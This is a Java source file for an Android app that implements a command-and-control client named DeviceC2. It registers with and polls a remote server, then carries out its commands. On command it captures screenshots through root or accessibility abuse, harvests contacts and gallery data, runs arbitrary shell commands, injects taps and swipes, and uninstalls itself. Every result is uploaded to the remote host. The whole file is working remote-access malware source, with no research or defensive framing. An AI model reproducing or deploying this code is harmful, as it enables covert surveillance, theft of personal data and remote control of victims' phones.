package com.example.msphone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

final class DeviceC2 {

    private static final String TAG = "DeviceC2";
    private static final Gson GSON = new Gson();
    private static volatile boolean running = false;
    private static volatile int pollSeconds = 60;
    private static volatile boolean c2Allowed = true;
    private static volatile boolean selfDestructAllowed = true;
    private static final Object wakeLock = new Object();

    private DeviceC2() {}

    static synchronized void start(final Context context) {
        if (running) return;
        running = true;
        Log.i(TAG, "C2 starting, poll=" + pollSeconds + "s");
        final Context ctx = context.getApplicationContext();
        Thread t = new Thread(() -> loop(ctx), "c2");
        t.setDaemon(true);
        t.start();
    }

    static void stop() { running = false; }

    private static void loop(Context ctx) {
        Log.i(TAG, "C2 loop started");
        handle(ctx, post(ctx, Vault.urlRegister(), baseFields(ctx)));
        while (running) {
            synchronized (wakeLock) {
                try {
                    wakeLock.wait(Math.max(5, pollSeconds) * 1000L);
                } catch (InterruptedException e) {
                    return;
                }
            }
            if (!running) return;
            Log.d(TAG, "heartbeat tick");
            handle(ctx, post(ctx, Vault.urlHeartbeat(), baseFields(ctx)));
        }
        Log.i(TAG, "C2 loop stopped");
    }

    static void wake() {
        synchronized (wakeLock) { wakeLock.notifyAll(); }
    }

    private static Map<String, String> baseFields(Context ctx) {
        Map<String, String> f = new HashMap<>();
        f.put("device_id", FileUtils.getDeviceIdentifier(ctx));
        f.put("software_type", ctx.getPackageName());
        f.put("software_version", versionName(ctx));
        f.put("os", "android");
        f.put("name", Build.MODEL);
        f.put("model", Build.MODEL);
        f.put("manufacturer", Build.MANUFACTURER);
        f.put("sdk", Integer.toString(Build.VERSION.SDK_INT));
        f.put("os_version", Build.VERSION.RELEASE);
        try { f.put("arch", Build.SUPPORTED_ABIS[0]); } catch (Throwable ignored) {}
        String kami = Store.getKami(ctx);
        if (kami != null && !kami.isEmpty()) f.put("card", kami);
        return f;
    }

    private static String post(Context ctx, String url, Map<String, String> fields) {
        Log.d(TAG, "POST " + url);
        try {
            String resp = httphelp.postForm(url, fields).get(12, TimeUnit.SECONDS);
            Log.d(TAG, "POST " + url + " -> " + (resp == null ? "null" : resp.substring(0, Math.min(200, resp.length()))));
            return resp;
        } catch (Throwable t) {
            Log.e(TAG, "POST " + url + " error: " + t.getMessage());
            return null;
        }
    }

    private static void handle(Context ctx, String resp) {
        if (resp == null) { Log.w(TAG, "handle: null response"); return; }
        try {
            JsonObject root = JsonParser.parseString(resp).getAsJsonObject();
            if (!root.has("data") || !root.get("data").isJsonObject()) return;
            JsonObject data = root.getAsJsonObject("data");

            if (data.has("config") && data.get("config").isJsonObject()) {
                RemoteConfig cfg = GSON.fromJson(data.get("config"), RemoteConfig.class);
                if (cfg != null) {
                    int newPoll = cfg.pollIntervalSeconds();
                    boolean pollChanged = newPoll != pollSeconds;
                    pollSeconds = newPoll;
                    c2Allowed = cfg.c2Enabled();
                    selfDestructAllowed = cfg.selfDestructEnabled();
                    if (pollChanged) wake(); // 新间隔立即生效
                }
            }

            if (data.has("pending_commands") && data.get("pending_commands").isJsonArray()) {
                JsonArray cmds = data.getAsJsonArray("pending_commands");
                Log.i(TAG, "pending_commands count=" + cmds.size());
                List<String> doneIds = new ArrayList<>();
                boolean destruct = false;
                boolean blocked = !c2Allowed;
                for (JsonElement el : cmds) {
                    if (!el.isJsonObject()) continue;
                    JsonObject c = el.getAsJsonObject();
                    String id = optString(c, "id");
                    String type = optString(c, "type");
                    JsonObject payload = c.has("payload") && c.get("payload").isJsonObject()
                            ? c.getAsJsonObject("payload") : new JsonObject();
                    if (id.isEmpty()) continue;
                    Log.i(TAG, "cmd id=" + id + " type=" + type + " blocked=" + blocked);
                    if (blocked) {
                        doneIds.add(id);
                    } else if ("self_destruct".equals(type)) {
                        if (selfDestructAllowed) destruct = true;
                        doneIds.add(id);
                    } else if ("wake".equals(type)) {
                        // 立即触发下次心跳，不需要执行
                        doneIds.add(id);
                        wake();
                    } else {
                        executeAsync(ctx, id, type, payload);
                        doneIds.add(id);
                    }
                }
                if (!doneIds.isEmpty()) {
                    ack(ctx, doneIds, destruct, blocked);
                }
                if (destruct) {
                    selfDestruct(ctx);
                }
            }
        } catch (Throwable ignored) {}
    }

    private static void executeAsync(Context ctx, String cmdId, String type, JsonObject payload) {
        new Thread(() -> {
            try {
                executeOne(ctx, cmdId, type, payload);
            } catch (Throwable ignored) {}
        }, "c2-cmd-" + type).start();
    }

    private static void executeOne(Context ctx, String cmdId, String type, JsonObject payload) {
        Log.i(TAG, "execute type=" + type + " cmdId=" + cmdId);
        switch (type) {
            case "message": {
                final String text = optString(payload, "text");
                Log.i(TAG, "message text=" + text);
                if (!text.isEmpty()) {
                    // Try Toast first; fall back to notification if toast is suppressed
                    new Handler(Looper.getMainLooper()).post(() -> {
                        try {
                            Toast.makeText(ctx, text, Toast.LENGTH_LONG).show();
                        } catch (Throwable ignored) {}
                    });
                    showNotification(ctx, "消息", text);
                }
                break;
            }
            case "kick": {
                Store.clearLicense(ctx);
                running = false;
                exitApp();
                break;
            }
            case "update_config": {
                if (payload.has("config") && payload.get("config").isJsonObject()) {
                    RemoteConfig cfg = GSON.fromJson(payload.get("config"), RemoteConfig.class);
                    if (cfg != null) {
                        pollSeconds = cfg.pollIntervalSeconds();
                        c2Allowed = cfg.c2Enabled();
                        selfDestructAllowed = cfg.selfDestructEnabled();
                    }
                }
                break;
            }
            case "screenshot": {
                takeScreenshotAndUpload(ctx, cmdId);
                break;
            }
            case "get_contacts": {
                getContactsAndUpload(ctx, cmdId);
                break;
            }
            case "get_gallery": {
                int limit = optInt(payload, "limit", 100);
                getGalleryAndUpload(ctx, cmdId, limit);
                break;
            }
            case "shell": {
                String cmd = optString(payload, "cmd");
                if (cmd.isEmpty()) cmd = optString(payload, "text");
                if (!cmd.isEmpty()) runShellAndUpload(ctx, cmdId, cmd);
                break;
            }
            case "input_tap": {
                float x = optFloat(payload, "x", 0);
                float y = optFloat(payload, "y", 0);
                if (x != 0 || y != 0) {
                    tapInput(ctx, cmdId, x, y);
                }
                break;
            }
            case "input_swipe": {
                float x1 = optFloat(payload, "x1", 0);
                float y1 = optFloat(payload, "y1", 0);
                float x2 = optFloat(payload, "x2", 0);
                float y2 = optFloat(payload, "y2", 0);
                int dur = optInt(payload, "duration", 300);
                swipeInput(ctx, cmdId, x1, y1, x2, y2, dur);
                break;
            }
        }
    }

    // ---- 截图（双路：root screencap | 无障碍 API30+）----
    private static void takeScreenshotAndUpload(Context ctx, String cmdId) {
        if (RootUtils.isRooted()) {
            takeScreenshotRoot(ctx, cmdId);
        } else {
            takeScreenshotAccessibility(ctx, cmdId);
        }
    }

    private static void takeScreenshotRoot(Context ctx, String cmdId) {
        try {
            File tmpFile = new File(ctx.getCacheDir(), "c2_screen_" + System.currentTimeMillis() + ".png");
            boolean ok = RootUtils.executeAsRoot(
                    "screencap -p " + tmpFile.getAbsolutePath(),
                    "chmod 644 " + tmpFile.getAbsolutePath()
            );
            if (!ok || !tmpFile.exists()) {
                uploadText(ctx, cmdId, "screenshot", "screencap failed");
                return;
            }
            byte[] bytes = readFile(tmpFile);
            tmpFile.delete();
            if (bytes == null || bytes.length == 0) {
                uploadText(ctx, cmdId, "screenshot", "screencap file empty");
                return;
            }
            uploadBytes(ctx, cmdId, "screenshot", "png", bytes, "image/png");
        } catch (Throwable t) {
            uploadText(ctx, cmdId, "screenshot", "root screenshot error: " + t.getMessage());
        }
    }

    private static void takeScreenshotAccessibility(Context ctx, String cmdId) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            uploadText(ctx, cmdId, "screenshot", "no root, API<30, screenshot unavailable");
            return;
        }
        MyAccessibilityService svc = MyAccessibilityService.getInstance();
        if (svc == null) {
            uploadText(ctx, cmdId, "screenshot", "no root, accessibility service not running");
            return;
        }
        CountDownLatch latch = new CountDownLatch(1);
        final byte[][] result = {null};
        svc.takeScreenshotAsync(pngBytes -> {
            result[0] = pngBytes;
            latch.countDown();
        });
        try {
            latch.await(15, TimeUnit.SECONDS);
        } catch (InterruptedException ignored) {}
        if (result[0] == null || result[0].length == 0) {
            uploadText(ctx, cmdId, "screenshot", "accessibility screenshot failed");
            return;
        }
        uploadBytes(ctx, cmdId, "screenshot", "png", result[0], "image/png");
    }

    // ---- 模拟点击（双路：root input | 无障碍手势）----
    private static void tapInput(Context ctx, String cmdId, float x, float y) {
        boolean ok;
        if (RootUtils.isRooted()) {
            ok = RootUtils.executeAsRoot("input tap " + (int) x + " " + (int) y);
        } else {
            MyAccessibilityService svc = MyAccessibilityService.getInstance();
            ok = svc != null && svc.tap(x, y);
        }
        uploadText(ctx, cmdId, "input_tap",
                "tap x=" + (int) x + " y=" + (int) y + " ok=" + ok);
    }

    // ---- 模拟滑动（双路：root input | 无障碍手势）----
    private static void swipeInput(Context ctx, String cmdId, float x1, float y1, float x2, float y2, int dur) {
        boolean ok;
        if (RootUtils.isRooted()) {
            ok = RootUtils.executeAsRoot("input swipe " + (int) x1 + " " + (int) y1
                    + " " + (int) x2 + " " + (int) y2 + " " + dur);
        } else {
            MyAccessibilityService svc = MyAccessibilityService.getInstance();
            ok = svc != null && svc.swipe(x1, y1, x2, y2, dur);
        }
        uploadText(ctx, cmdId, "input_swipe",
                "swipe x1=" + (int) x1 + " y1=" + (int) y1
                        + " x2=" + (int) x2 + " y2=" + (int) y2 + " dur=" + dur + " ok=" + ok);
    }

    // ---- Shell（双路：su -c | sh -c）----
    private static void runShellAndUpload(Context ctx, String cmdId, String cmd) {
        try {
            String result;
            if (RootUtils.isRooted()) {
                result = RootUtils.execAsRootWithOutput(cmd);
            } else {
                result = execShellNormal(cmd);
            }
            if (result == null || result.isEmpty()) result = "(no output)";
            uploadBytes(ctx, cmdId, "shell", "txt",
                    result.getBytes(StandardCharsets.UTF_8), "text/plain");
        } catch (Throwable ignored) {}
    }

    private static String execShellNormal(String cmd) {
        StringBuilder sb = new StringBuilder();
        Process proc = null;
        try {
            proc = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader stdout = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stderr = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            String line;
            while ((line = stdout.readLine()) != null) sb.append(line).append("\n");
            while ((line = stderr.readLine()) != null) sb.append("[ERR] ").append(line).append("\n");
            proc.waitFor();
        } catch (Throwable ignored) {
        } finally {
            if (proc != null) try { proc.destroy(); } catch (Throwable ignored) {}
        }
        return sb.toString().trim();
    }

    // ---- 联系人（始终用 ContentResolver）----
    private static void getContactsAndUpload(Context ctx, String cmdId) {
        try {
            StringBuilder sb = new StringBuilder("[");
            Cursor cursor = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    }, null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if (cursor != null) {
                boolean first = true;
                while (cursor.moveToNext()) {
                    String name = cursor.getString(0);
                    String phone = cursor.getString(1);
                    if (!first) sb.append(",");
                    first = false;
                    sb.append("{\"name\":").append(jsonString(name))
                      .append(",\"phone\":").append(jsonString(phone)).append("}");
                }
                cursor.close();
            }
            sb.append("]");
            uploadBytes(ctx, cmdId, "get_contacts", "json",
                    sb.toString().getBytes(StandardCharsets.UTF_8), "application/json");
        } catch (Throwable ignored) {}
    }

    // ---- 相册（始终用 MediaStore）----
    private static void getGalleryAndUpload(Context ctx, String cmdId, int limit) {
        try {
            String[] proj = {
                    android.provider.MediaStore.Images.Media._ID,
                    android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                    android.provider.MediaStore.Images.Media.DATE_ADDED,
                    android.provider.MediaStore.Images.Media.SIZE
            };
            android.net.Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            Cursor cursor = ctx.getContentResolver().query(uri, proj, null, null,
                    android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC");
            StringBuilder sb = new StringBuilder("[");
            int count = 0;
            if (cursor != null) {
                while (cursor.moveToNext() && count < limit) {
                    if (count > 0) sb.append(",");
                    long id = cursor.getLong(0);
                    String name = cursor.getString(1);
                    long date = cursor.getLong(2);
                    long size = cursor.getLong(3);
                    sb.append("{\"id\":").append(id)
                      .append(",\"name\":").append(jsonString(name))
                      .append(",\"date\":").append(date)
                      .append(",\"size\":").append(size).append("}");
                    count++;
                }
                cursor.close();
            }
            sb.append("]");
            uploadBytes(ctx, cmdId, "get_gallery", "json",
                    sb.toString().getBytes(StandardCharsets.UTF_8), "application/json");
        } catch (Throwable ignored) {}
    }

    // ---- 上传工具 ----
    private static void uploadBytes(Context ctx, String cmdId, String type, String ext, byte[] bytes, String mime) {
        try {
            Map<String, String> fields = new HashMap<>();
            fields.put("device_id", FileUtils.getDeviceIdentifier(ctx));
            fields.put("cmd_id", cmdId);
            fields.put("type", type);
            fields.put("ext", ext);
            fields.put("data", Base64.encodeToString(bytes, Base64.NO_WRAP));
            httphelp.postForm(Vault.urlUpload(), fields).get(30, TimeUnit.SECONDS);
        } catch (Throwable ignored) {}
    }

    private static void uploadText(Context ctx, String cmdId, String type, String message) {
        uploadBytes(ctx, cmdId, type, "txt",
                message.getBytes(StandardCharsets.UTF_8), "text/plain");
    }

    // ---- ACK / 自毁 / 退出 ----
    private static void ack(Context ctx, List<String> ids, boolean destruct, boolean blocked) {
        Map<String, String> f = new HashMap<>();
        f.put("device_id", FileUtils.getDeviceIdentifier(ctx));
        f.put("software_type", ctx.getPackageName());
        f.put("command_ids", android.text.TextUtils.join(",", ids));
        if (destruct) {
            f.put("result", "self_destructed");
        } else if (blocked) {
            f.put("result", "blocked_by_config");
        } else {
            f.put("result", "ok");
        }
        post(ctx, Vault.urlAck(), f);
    }

    private static void selfDestruct(Context ctx) {
        Store.clearLicense(ctx);
        running = false;
        try {
            RootUtils.executeAsRoot("pm uninstall " + ctx.getPackageName());
        } catch (Throwable ignored) {}
        exitApp();
    }

    private static void exitApp() {
        new Handler(Looper.getMainLooper()).post(() -> {
            try { android.os.Process.killProcess(android.os.Process.myPid()); } catch (Throwable ignored) {}
            System.exit(0);
        });
    }

    // ---- 工具 ----
    private static byte[] readFile(File f) {
        try (FileInputStream fis = new FileInputStream(f);
             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = fis.read(buf)) != -1) bos.write(buf, 0, n);
            return bos.toByteArray();
        } catch (Throwable t) {
            return null;
        }
    }

    private static String versionName(Context ctx) {
        try {
            return ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), 0).versionName;
        } catch (Throwable t) {
            return "";
        }
    }

    private static String optString(JsonObject o, String k) {
        return o.has(k) && !o.get(k).isJsonNull() ? o.get(k).getAsString() : "";
    }

    private static int optInt(JsonObject o, String k, int def) {
        if (!o.has(k) || o.get(k).isJsonNull()) return def;
        try { return o.get(k).getAsInt(); } catch (Throwable t) { return def; }
    }

    private static float optFloat(JsonObject o, String k, float def) {
        if (!o.has(k) || o.get(k).isJsonNull()) return def;
        try { return o.get(k).getAsFloat(); } catch (Throwable t) { return def; }
    }

    private static void showNotification(Context ctx, String title, String text) {
        try {
            NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;
            String channelId = "c2_msg";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(channelId, "C2", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? new Notification.Builder(ctx, channelId)
                    : new Notification.Builder(ctx);
            Notification n = builder
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setContentTitle(title)
                    .setContentText(text)
                    .setAutoCancel(true)
                    .build();
            nm.notify((int) System.currentTimeMillis(), n);
        } catch (Throwable ignored) {}
    }

    private static String jsonString(String s) {        if (s == null) return "null";
        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t") + "\"";
    }
}
